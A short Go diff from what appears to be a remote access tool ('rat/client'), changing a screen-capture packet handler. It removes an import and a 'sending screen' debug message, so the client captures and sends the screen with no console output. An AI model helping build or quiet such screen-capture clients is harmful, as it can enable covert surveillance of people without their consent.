@@ -2,7 +2,6 @@ package main
 
 import (
 	"bytes"
-	"fmt"
 	"image"
 	"image/jpeg"
 	"rat/client/network/header"
@@ -53,7 +52,6 @@ func (packet RecvScreenPacket) OnReceive() error {
 }
 
 func (packet *SendScreenPacket) Init() {
-	fmt.Println("sending screen")
 	screen.QueryMonitors()
 
 	var w bytes.Buffer
